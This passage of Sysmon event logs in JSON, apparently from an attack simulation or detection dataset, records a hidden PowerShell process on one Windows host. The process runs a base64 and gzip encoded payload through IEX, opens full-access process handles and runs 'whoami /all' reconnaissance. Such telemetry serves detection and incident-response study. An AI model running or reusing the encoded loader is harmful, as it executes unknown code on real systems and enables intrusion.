GUAeABUAFcASwBZAGUAeQBEAEoAUgA4ADEATwBhAFcAbQArAGgAbgA5AEsAUABGAGMAOQBIADgATQB3AEEAOQBLAC8AegB1ADAAQgBYAGoAbABQAFAAYwBPAFgAVwBuAFEANQAzAGoAVgBLADkAVQAvAEsAaABWAGgAVABYAHcANABqACsAMABqAGYASwAyAGcAawBPAGkAVgB1AFIAZABqAFAAYwBLADMATwA5ACsAQQBUADUAdgB5AHIAcQA1AGQANgAzAFYAQwA0AEIAYgBFAHQAVQA1ADgASgAyADcAQgBQAFMAcAB1AHQAKwBEADcASgB0AG8AawB4AGMAVgBOAG4ARAA3AFgAdgBoAEcAcABiAHAAOABZAHYAeABFAEsATQBoAEcATQAyADcAYwBqADMANABBAHMAUgBUAEIALwBGAGEASgBMAEkAUQBVAHgAbgBQADAATgBGAHgAVQBSAGMAZgA4AE4AQQBBAEEAPQAiACkAKQA7AEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACQAcwAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7AA==",
            "decoded_command_line": "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(\"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\"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();",
            "event_id": "026564ea0cd8f80b25f0954b91e217f9c88eeb10d2bc809491385689017e4857",
            "event_type": "process",
            "event_utc": "2020-09-24T18:16:10.806Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "FF59EF73460173ABDB10EDE1A0BC9CE6",
                "SHA256": "34507738F84B9D4F231DC0C187FEE4A03B4DDB84CF63FF56A4A1761A9BD56EA6"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "026564ea0cd8f80b25f0954b91e217f9c88eeb10d2bc809491385689017e4857",
            "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "PowerShell.EXE",
            "parent_command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"",
            "parent_exe": "powershell.exe",
            "parent_image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_process_guid": "{DD483508-D9EC-5F6C-0000-0010F5B56F00}",
            "pid": 3164,
            "ppid": 4484,
            "process_guid": "{DD483508-E26A-5F6C-0000-0010E5C60401}",
            "record_number": "4096700",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T18:16:10.812Z",
            "timestamp": 1600971370812,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-E26A-5F6C-0000-0010E5C60401}"
        },
        {
            "action": "access",
            "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+a18c4|C:\\windows\\System32\\KERNELBASE.dll+1075a|C:\\windows\\System32\\KERNELBASE.dll+d846|C:\\windows\\System32\\KERNEL32.DLL+1c6e3|C:\\Program Files\\Windows Event Reporting\\Core\\EventReporting.ApplicationFilter.Monitor.Win64.dll+3286e|UNKNOWN(00007FFFAF121000)",
            "event_id": "cb11f23c4789e30b5f7f308ca68d519d2c6507b1405cebef4666007c4695f2f9",
            "event_type": "process",
            "event_utc": "2020-09-24T18:16:10.798Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "granted_access": "0x1fffff",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "cb11f23c4789e30b5f7f308ca68d519d2c6507b1405cebef4666007c4695f2f9",
            "image_path": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 3164,
            "process_guid": "{DD483508-E26A-5F6C-0000-0010E5C60401}",
            "record_number": "4096701",
            "src_exe": "powershell.exe",
            "src_image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "src_pid": "4484",
            "src_process_guid": "{DD483508-D9EC-5F6C-0000-0010F5B56F00}",
            "subtype": "access",
            "time": "2020-09-24T18:16:10.813Z",
            "timestamp": 1600971370813,
            "uuid": "{DD483508-E26A-5F6C-0000-0010E5C60401}"
        },
        {
            "action": "create",
            "creation_time": "2020-09-24 18:16:11.689",
            "event_id": "49250f36efb04d62b04555a2937f83342b81eccae87f60f2fa665ec58250b99c",
            "event_type": "file",
            "event_utc": "2020-09-24T18:16:11.689Z",
            "exe": "powershell.exe",
            "file_name": "__PSScriptPolicyTest_m20hrydp.wwj.ps1",
            "file_path": "C:\\Users\\mcasey\\AppData\\Local\\Temp\\__PSScriptPolicyTest_m20hrydp.wwj.ps1",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "49250f36efb04d62b04555a2937f83342b81eccae87f60f2fa665ec58250b99c",
            "image_path": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 3164,
            "process_guid": "{DD483508-E26A-5F6C-0000-0010E5C60401}",
            "record_number": "4096702",
            "subtype": "create",
            "time": "2020-09-24T18:16:11.690Z",
            "timestamp": 1600971371690,
            "uuid": "{DD483508-E26A-5F6C-0000-0010E5C60401}"
        },
        {
            "action": "create",
            "command_line": "\"c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe\" -Version 5.1 -s -NoLogo -NoProfile",
            "decoded_command_line": "",
            "event_id": "ea63354663b66b8dd5af8b9ca848952c12605b6210b23c75ffd1459f8b4fee28",
            "event_type": "process",
            "event_utc": "2020-09-24T18:16:12.880Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "8F928AF9C3A8CE4244556AAF3AE31B10",
                "SHA256": "67715009A6373ACC7C2BB491D93C3EDDD3D0F989C4C2FB60618E056898E60E49"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "ea63354663b66b8dd5af8b9ca848952c12605b6210b23c75ffd1459f8b4fee28",
            "image_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "PowerShell.EXE",
            "parent_command_line": "\"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAWABXAFcALwBpAFMAaABaACsARAByAC8AQwBEADUARQBBAGgAUwBSAG0AQwBZAEUAZQB0AFgAUwA5AGcAcwBGADIAaQBHADMAVwAzAEMAagB5AFUAbwBEAEIAdQA4AHYAWQA1AG4AYgAvADkAMwB0AHMASQBEAGMAOQBuAFoANQBwAGEAUQBiAEoAbwBxAHAAOAAxAHUAOABzAGQAYQB3AGkAZgBLAHYAaQB5AEQAYQB4ADUARgB1AEkAdQBKADIAaABLAEwAWgA5AGoAMgBoAFYASwB0AGUAcwBMADIARABpAEsALwBGAEgAdABiAEoATwBQAEIATQBYAHgAOABYAGkAYgBZAFAAdwBXAHgARAA1ADUAcAB0AHUAVwBSAEcASwBZACsASwB2AHkAdABWAEUAagAzAFMAWABxAEYAMABmADkATwBqAE4AOQBhADMARQBRAFEAMgBpADMAQgBTAEUAeQBFAG8AaQBWAEwAKwA2AHEAbAB5AFYAUgA0AGsAWAA2ADIAdgAwADUAdQBuAFkAUABxAEEAMwBGACsARwB0AGIAOABXAGcAcQBQAFoAQwBCAFEASAByAHUANwByAHQAdgBYADcANQB3AGkAUgBSAGgARAB4ADgAMgB0ADgATgBFAEsAYgBpAEcATABtAEcAWQA2AE8ANABWAGkAZQArAEUAZgBNAHQAaQB0AEQAdABrADcARgBEAEoAaQBiACsASQBxADcAZgA3AGcAYQBPAGIAKwBqAE8AbQBTAHgAbgBkAEgATQBMAEQAbABHAGUAVgBiAHcAVABmAFYATQB2AFAATABoAFQAQQA4AGYARwB0AGUAcQBmAGYAMQBiAHIATAA3AGYATgAxAHoAcwB1AFQASABRAG4AcgBsAFgAVgBQAE0AYgBJAHYAYgBNAGMAcAAxAG8AbgB2AHQAYwBMAGgAVgBvAGUAbwBGAHAAVgBzAHMAMwBJAGoALwAwADEAdgBwAHYAYgBYAHIAdAAxAE4AeQAyAHQAbAAwAHYAagBwAFoAUAB0ADEAZgByAFoAcwAwADIAZwBnAHgAKwAvAGQAcgBLAFEAZQB1AEsAcABWAFcARQA1AEEAVwB5AG8ARQA0AGIAVgBCAHYARgBTADYASAB0ADUAZgBTAFgAKwBlAEwAZABHAFMAVAB4AHMAdQArAGgATwA4AEQAQwBLAC8ARQBCAEYAMABjAEUAMgBVAFgAdwAzADEARAAzAEwAUQBRAHAAYQBBADEAcwAxAGgAdgBCADUAbQAyAG8AZABqAEkAZwBRAFQAaQBLAFAAdQBOAGcAQwBmAEEAZAAvAGoAMgByAFgAWAB1AEkANABEAFoARAA3ADgAcgB0AHkAWAAyAHMAeQBTAGkALwBnAC8AaQA1AFQANwBTAE0AVABVAEUAMQB3AFYARwArAGMAYwArAEoAMwA0AEoARABLAHYARABtAEoAQQAzAGQAKwBzAHYANQBEAGMAdABYAGgAOQAxAE8AQwAxAFMAdgBmAEsANQArAGsAcQBvAFUAYwB0AE4ARQB4AGUAcwBPAEEANwA0AGQAYwByAFYAeABkAHYAWgBSAEwAQgBQADcAVQBKAG4ANQBzAGwAMwB4AGYAQwBiAEoAQgBTAEcAQwBFAGoAdgAwAG8ATAA4AEsAcABSAFEAbQBxAHYALwA0AFQAbgA1AFAAYQBDADIAZgBjACsASwBXAGcANQBvAFgAcgB6AEgATQBLAHoAOABtAE8AcgA4AFQATAB6AEwAZQB0ADEAOABwAFYAdgBYAEwATwBuAHUATAA4AHoAVQBoAHMAeAAwAEoAUgA4AGYANwBYADEAYwBDAGkAdABlADAAaABOAHYAZAAwADEAegBZAHYAQwBWAC8ANwBMAEcAWgBvADcAYQBBAFMAagA3AHMATABtAFEAeAAyADEAcQByAG4ARgA4AGgAaQB6ACsAaABVAEMAMABCAGYAZgBtAGIAagBYAEIAdQAvADgAOQBJAG4ANAB5AGcAVAA0AGgANgBEAFYAWgBBAFMAOQBSACsATgBPAGMAVwB3AFYAaABVADgAQwBiAG0AQQAzADIAawBQAGEAWABxADkAaABqAEoARABGACsAcAB6AGEAZQBVAFgANwBjAFcAKwB5AEcAWABHADAAZQBPADQAUQBVAHcAUwBxAEgATwB6AFEAYQBoAEkAZAA1AEQAVgBJAEMAZwB2AHQAcwArAHYAcQBBAFQANwA1AGIATAA2AGoANwBsAFMANABtAEQAYgAxAEcATgA4AEUAZgBkAGEALwB3AFQAUwBzADIAcgBHADkANgBCAGkARQBoAE8AaQBDAHoAQgBvAGEAbwBCAE0AVwAzAGMASwBWAEIAcgBFADAATABZAFEAbgBhAHYAMgA1AG0ASgBDADkAVgBOAE0ARwBOADEAeABvAE8AUgBBADAAZwBGAGkAQQBpAGMARgBGAGkAbwB1AGMAaQBhAHkARwB2ACsAZQBIAC8AVQA3AEYAVwBIAEIARABSAHoAawBBAG4AWABaAGgAWABoAEgAMwAwAEQAUABPAFYAZABVAG0AVwA3ADYAQgBsAG4AVgAvADIARAAyAHAAVQA1AE8AUgBWAEYAZwBkAFEASABwAGcAOQBHAFEAQQBLAHIAagA0AHcAWQB4AHMAeQBNAE0AZgBhADMAYQArAEMAbgB4AC8AagBmAHoAZgBtAHcAeABQADUAagBKAFIATwBnAGMAeQBGAHAAWgBpAEMAOQAwAGoAbwB0AHkASwBTAG4ATgA0AG4ATAA1ACsAbwA1AGwAaQBWAHkARQBBAFQAVQArADgAbAAxAGEAagAxAEcAMwBvADUAWgB0AHIARgBaAHQAOQA1AEoAUQB5AEsAWABkAGMAegBjAGEAYwBBAGQAKwBHAEEANAA1AEQAWgA0AEQAUABPADIAUQA1ADAAUgB4AHAAQQBTADAASQBwAHAAYwA4AGoAUQBaAGsAcQBPADEAOABOAHgAagBPADAAbQBhAEMASQBsAEcAawAyADIAZQBCAEwAcABqAE8ATwBEAFcAdwB1AEgASgBYAHoAWQBUAHQAOQBPADAAQQB1AEUAZwB3ADEAbgA4AEcAQQA1AGoAVgBqAGkAdwAxAEwAQQBWACsAbgB4ADMAWQAvAGYAUABjAGsANwA4AHoAMABiAGEATgBCAFkAQwAvADIAZwBNACsATQA1AHcARgB2AE0ARgAvAFYAQQA0ADAASAB6AEkAOQBIADEAWQAzAHcAcwBIAHgAaAA4AEIAWAA2ADgAYgBlAEgAUgBxAGQAUgBBADMANgBxAEsARgBhAEsAWgB0ADMARQBQADYASgBzAHYASABzAHgAdQBWAGIAQQA1AG0AdQBTAHoATwB1AEUAQgBXAFAAVQBzADAAbQBzAC8AOABTAEQANgAyAGMAdgBBAEoALwBGAEwAYgBRADQAVwAwADQARgBFAHoAcAB6AG4AMwBOAGIATQBmAGgAOABQAEMAWAAwAFMATABvAGUAbQBOAFIAcwBKAHcAbABLAHMAUABHADEAdgBJADUAZABRAGsATQBSAGwARwBSADYAYwA5AFcAUgAzAHoAcwBBAGYAOABjAGcAYwB3AHkAZABSAGMAVQBqAHAAZABLAHoATQBYAGYARwBvAHUAWgBEAEUAZgBMAHUAVQBCADYAQQBpAFQAKwBhAFkAegBsAEUAVQAvAG8AMwBaAEMATgAyAEoAVgAxAFQAcQBxAFcAdABaAFUAbQB5AHYAbgBvAEMALwBNAHYAcABlAFcAKwBsAFUAcgBTADYAMQBwAC8ARABUAFMAOABMAEkAOQAwAGQAMQBPAG4AbgB0AGQAVgBkAGcASgBtAFcAZwBHAGUATABZAFkAZABTAE0AOQBaAHcATABSAFIAZwBhADkAeABvAFgAYwBrAGIAagBhAGoAUABvAGMAcgBEAG0AYwBrAGEAcQBxADUAQgBiAG8AZABZAFkAYQBPAHcAYQA5AEgAaQBOAEoANABJAFAAKwB3AEMALwAzAHEARAAwAFoAegArAFcAagAyAGEAWgBGAE0ANAA4AEUAOABHAE0AeQA3AHQAbwBnAHUANABlAGwATgBwAHkAegB2AEsASwB4AFgARQBCAHAAVgBKAE4AVAA5ADEATgBUAEkAegBOAHEAdQBGAC8ASgBBAHQAbgBaADMAawB3AGsAeQBwADUAdABsAHcATwBCAFAAUABZAEcARQBUAFcAUAA1ADMAbgBZAG0AZABKAFIAdABoAGQAMABiAGEAZAAwADAAZABiAEkAKwBXAFkANwA4ADgAZQBrAGMAVQBEADMAeQBlAHgAKwBmADYALwB1AFUAcABUAEcATwAzAE0AMABaAFgAbQBTAEQAWQArAGkAUgBuAGYAUwBJAE8AMgBvAGMAbQB2AEsAcgBSAFQAVwBIAFgASABLAHYAcgBrAFkAUABNAHUASgB4AGoAdABqAGoAZQB3AHoATABHADMASwBYAEMAcQBKAFMAeQA1ADcAbQBwAEsAagBoAGIAcgBuAEoAOABwADIAdwB4AG8AZQBIAGEANAAyADAAbwB4AFYAcABDAFgAVgBWAHMAYgBhADEASgBKAG0AUABNAFUAYQBDAHoAQgA3AFEANgBvAEQAUwBuADYAZQBLAGMASwBTAFMAcAB0ADQANQBaAG4AcwBjAHQARABQAHEASQB3AEQAVwBlAFMAYwB5ADUANABWAG4AdAA2AHcANwBMAHoAcABRAG0AUgBrAHIAawBXAE4AUgBYAHUALwBlADEAeABNAGIAOQB5AHUATQAzAFoANgBDAEYAUwA1AHIAdQBoAHMAZwArADIAVwBXAGcAYQB6ACsAKwBYAEUAVgBmAE4ASABSAG8AdABiAGEAMwBWAEkAdAA2AHgANABlAHUALwBTAEcAVABOAHYAcgBpAEkAegBiAFMAcABHAGoANQBuAGUAegBLAFoAdQBvAEUAMgA1AEEAYgB2AGEARAAvAGIAcQB5AGgATgBNAGoAegBhAGIAegBFAFQAcgB4AHIAdgArAEsAaABTADIAYQB6AC8AcQB5AHoATgBIAGYATgB3ADMAZwA5ADcARAB2AG0AMwBFAEwASABPAGoAVABIAE0AQgA2AGIAMQBnAHYARwBiAHYAQgBWADcAVgAwAG8AZgBSAEkAdQB6AE8ARAA2AHoATQBpAGYARQBtAFUAcwBuAFYAOAA3AHEAbgAyACsATgBRAHMAMgA3ADYANAB3ADUAZQBiADcAcABiAHoAKwBmAEoAMwBVAFEASwB4AFAAVgBEAHgAbABCAFMAMQB2AE8AVQBpAGMAcgBsAEYAQgBYAE0AbAB5AFoASwBBAG0AbgBMAEcANgAxADAAbQBvAHAASwAwAGsAOQB0AGUAYQB0AFkANAB5AEYARABQAFkAZgBMAHMAZABtAGQAWgBrAHcAdwA1AGwAbQBhAHYAMQArAGIAZABMAHMANQBkAHUAKwBGAGQAcABlAGoAYwArAEYAeAAvAGkAVAAxAFIAMwA3ADQAWgBPAC8AbQBxADcANgBXAEwASABkAHEALwAyAG0AKwBXAFUAQQB1ADcAcAAwAGQANQBQAEUAUgBjAGwAcQBFAFoAeQBlADAARgBSAEYAMQByAEQAUwBEAEgASQB0AEgAdgBsAFAAVQBoAEgAQQBJAGMAbgBNAGMAYwBSAFkAWAA3AHkAagBZAG0AOABPAFoASwBCAG4AegBNAEwAVwBPAHIAUwBDAFIARgB3AC8ANgBaAGkAOABrAEQATgBTADQATQBVAEEAMwByAEIAagBpAFIAOABnADcAUQBXAE8AVgBXAE8AYQAyAGwATQBvAHEAZwBqAEsAdwBwAGQAQgBsAEYAbgByAFIAdgBRAEEAcgBtAEUAZQB5ADQAbwA3AC8ARgB3AEgALwB0AHcANABtADMAdgBzAFQAZABDAFYAbwBlAE0AWAA1AHoAVQAyADkAbQBCAFAAZQAzADcAeABjAFoANgArAFgAdQBlADUAOQBmADIAdABrAEkASwAzADkAVQBQAFMANgA4AHMAMQBCAC8AOQBEAGgAZgBqAFUAcwBTAFgAbwBVAGIAMwBVAEgATwBoADgATQBQAEoAZgByAGkAdgBjAGoALwBqAHkAMgBUAEgAeQA3ADQASwBqAFYAUABwACsAMAA5AHkAagB5AGsAQQBOAFQASwBNAHkAcABsAHkAWgBQAE8AWQA1AHYARgBvAFAAVwBMAHkAWQBlAEcAUAB0AE8AdwA5AGcAcgBYAEcAWgBUAFcATABaAGIAbgA2ADcAcQB4AEQAcwBoAFQARgBjAG4AbgA0AHgAawB2AFMANgBIAGsAYgBPAEgAbAA1AG4AcwBRAHYAagBsAHkAdwByAGMAYQAzAHcAQQBVAFUAVABlAEIAbQA4AGIAQgBKAG0AMQBTAFoASQBzAC8AagB0AGsAdgBmAEwANwBzAEQAQgArAGsATgBmAGUAeABUAFcASwBZAGUAeQBEAEoAUgA4ADEATwBhAFcAbQArAGgAbgA5AEsAUABGAGMAOQBIADgATQB3AEEAOQBLAC8AegB1ADAAQgBYAGoAbABQAFAAYwBPAFgAVwBuAFEANQAzAGoAVgBLADkAVQAvAEsAaABWAGgAVABYAHcANABqACsAMABqAGYASwAyAGcAawBPAGkAVgB1AFIAZABqAFAAYwBLADMATwA5ACsAQQBUADUAdgB5AHIAcQA1AGQANgAzAFYAQwA0AEIAYgBFAHQAVQA1ADgASgAyADcAQgBQAFMAcAB1AHQAKwBEADcASgB0AG8AawB4AGMAVgBOAG4ARAA3AFgAdgBoAEcAcABiAHAAOABZAHYAeABFAEsATQBoAEcATQAyADcAYwBqADMANABBAHMAUgBUAEIALwBGAGEASgBMAEkAUQBVAHgAbgBQADAATgBGAHgAVQBSAGMAZgA4AE4AQQBBAEEAPQAiACkAKQA7AEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACQAcwAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7AA==",
            "parent_exe": "powershell.exe",
            "parent_image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_process_guid": "{DD483508-E26A-5F6C-0000-0010E5C60401}",
            "pid": 3544,
            "ppid": 3164,
            "process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "record_number": "4096710",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T18:16:12.888Z",
            "timestamp": 1600971372888,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-E26C-5F6C-0000-0010E0300501}"
        },
        {
            "action": "access",
            "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+a18c4|C:\\windows\\System32\\KERNELBASE.dll+1075a|C:\\windows\\System32\\KERNELBASE.dll+d846|C:\\windows\\System32\\KERNEL32.DLL+1c6e3|C:\\Program Files\\Windows Event Reporting\\Core\\EventReporting.ApplicationFilter.Monitor.Win64.dll+3286e|UNKNOWN(00007FFFAF121000)",
            "event_id": "51349aa0b181c6174b17f806661e71233604eb91965360c04fc85b1492125efa",
            "event_type": "process",
            "event_utc": "2020-09-24T18:16:12.877Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "granted_access": "0x1fffff",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "51349aa0b181c6174b17f806661e71233604eb91965360c04fc85b1492125efa",
            "image_path": "c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 3544,
            "process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "record_number": "4096711",
            "src_exe": "powershell.exe",
            "src_image_path": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "src_pid": "3164",
            "src_process_guid": "{DD483508-E26A-5F6C-0000-0010E5C60401}",
            "subtype": "access",
            "time": "2020-09-24T18:16:12.888Z",
            "timestamp": 1600971372888,
            "uuid": "{DD483508-E26C-5F6C-0000-0010E0300501}"
        },
        {
            "action": "create",
            "creation_time": "2020-09-24 18:16:14.173",
            "event_id": "389e17b46f0431e0ea2612a33f42148f22f997abc3d183f42409cccff58058dd",
            "event_type": "file",
            "event_utc": "2020-09-24T18:16:14.173Z",
            "exe": "powershell.exe",
            "file_name": "__PSScriptPolicyTest_g0gl4elh.etn.ps1",
            "file_path": "C:\\Users\\mcasey\\AppData\\Local\\Temp\\__PSScriptPolicyTest_g0gl4elh.etn.ps1",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "389e17b46f0431e0ea2612a33f42148f22f997abc3d183f42409cccff58058dd",
            "image_path": "c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 3544,
            "process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "record_number": "4096712",
            "subtype": "create",
            "time": "2020-09-24T18:16:14.182Z",
            "timestamp": 1600971374182,
            "uuid": "{DD483508-E26C-5F6C-0000-0010E0300501}"
        },
        {
            "action": "create",
            "command_line": "C:\\windows\\system32\\cmd.exe /C whoami /all /fo list",
            "event_id": "2141ae44fe7a868c1bef1959ec3a4b2eb76b0a65e70de3707d7fba787a7c2f95",
            "event_type": "process",
            "event_utc": "2020-09-24T18:23:17.140Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
